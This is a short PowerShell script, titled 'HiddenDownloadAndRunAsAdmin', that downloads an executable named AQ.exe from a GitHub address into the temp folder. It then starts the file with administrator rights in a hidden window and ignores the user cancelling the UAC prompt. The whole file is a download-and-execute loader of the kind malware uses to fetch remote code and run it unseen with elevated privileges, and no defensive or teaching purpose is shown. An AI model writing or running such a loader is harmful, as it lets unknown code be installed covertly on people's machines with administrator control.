# HiddenDownloadAndRunAsAdmin.ps1
$url = "https://github.com/cctv-security/AQ/blob/main/AQ.exe"
$output = "$env:TEMP\AQ.exe"

# Create hidden window to download the file
$downloader = New-Object System.Net.WebClient
$downloader.DownloadFile($url, $output)

# Create hidden window to execute as admin
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $output
$psi.Verb = "runas" # Run as administrator
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi.CreateNoWindow = $true

try {
    [System.Diagnostics.Process]::Start($psi) | Out-Null
} catch {
    # User may have canceled UAC prompt
}
